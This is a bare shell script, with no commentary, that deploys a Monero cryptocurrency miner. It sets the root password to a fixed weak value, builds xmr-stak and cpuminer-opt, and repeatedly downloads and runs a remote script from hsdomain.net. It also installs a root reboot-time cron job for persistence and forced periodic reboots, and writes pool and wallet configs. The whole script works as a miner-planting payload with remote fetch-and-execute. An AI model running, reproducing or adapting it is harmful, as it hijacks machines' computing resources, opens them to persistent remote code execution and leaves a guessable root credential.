echo "root:123xxx123" | chpasswd && sudo apt-get update -y && sudo apt-get --assume-yes install libmicrohttpd-dev cmake build-essential libhwloc-dev git libuv1-dev automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev gcc make curl unzip gedit dh-autoreconf openssh-server screen libtool libncurses5-dev libudev-dev g++ iftop libgtk2.0-dev libboost-dev libboost-system-dev libboost-thread-dev vim && cd /usr/local/src/ && git clone https://github.com/JayDDee/cpuminer-opt && cd cpuminer-opt && chmod +x build.sh && ./build.sh || true && sudo make install && cd /usr/local/src/ && sudo wget http://hsdomain.net/xmr-stak-htk-1c-6c/do_api_change_pool/mine.sh && sudo echo "cd /usr/local/src/ && rm /usr/local/src/mine.sh; sudo wget http://hsdomain.net/xmr-stak-htk-1c-6c/do_api_change_pool/mine.sh && sleep 1m; bash /usr/local/src/mine.sh" > kalinh.sh && cronjob="@reboot bash /usr/local/src/kalinh.sh & sleep 28m; sudo reboot -f" && (crontab -u root -l; echo "$cronjob" ) | crontab -u root - && git clone https://github.com/fireice-uk/xmr-stak.git && sudo mkdir xmr-stak/build && cd xmr-stak/build && cmake .. -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF && make install -j$(nproc) && cd bin/ && sudo sysctl -w vm.nr_hugepages=128 &&

sudo bash -c 'cat <<EOT >>/usr/local/src/xmr-stak/build/bin/config.txt
"call_timeout" : 10,
"retry_time" : 5,
"giveup_limit" : 0,
"verbose_level" : 3,
"print_motd" : true,
"h_print_time" : 60,
"aes_override" : null,
"use_slow_memory" : "always",
"tls_secure_algo" : true,
"daemon_mode" : false,
"flush_stdout" : false,
"output_file" : "",
"httpd_port" : 99,
"http_login" : "",
"http_pass" : "",
"prefer_ipv4" : true,
EOT
' &&

sudo bash -c 'cat <<EOT >>/usr/local/src/xmr-stak/build/bin/cpu.txt
"cpu_threads_conf" :
[
{ "low_power_mode" : 1, "no_prefetch" : true, "asm" : "auto", "affine_to_cpu" : false },
{ "low_power_mode" : 1, "no_prefetch" : true, "asm" : "auto", "affine_to_cpu" : false },
],
EOT
' &&

sudo bash -c 'cat <<EOT >>/usr/local/src/xmr-stak/build/bin/pools.txt
"pool_list" :
[
{
"pool_address" : "us-east.cryptonight-hub.miningpoolhub.com:20580",
"wallet_address" : "htkadm.tetschangepool",
"rig_id" : "D", "pool_password" : "x", "use_nicehash" : true, "use_tls" : false, "tls_fingerprint" : "", "pool_weight" : 1
},
],
"currency" : "cryptonight_v8",
EOT
' &&
sudo reboot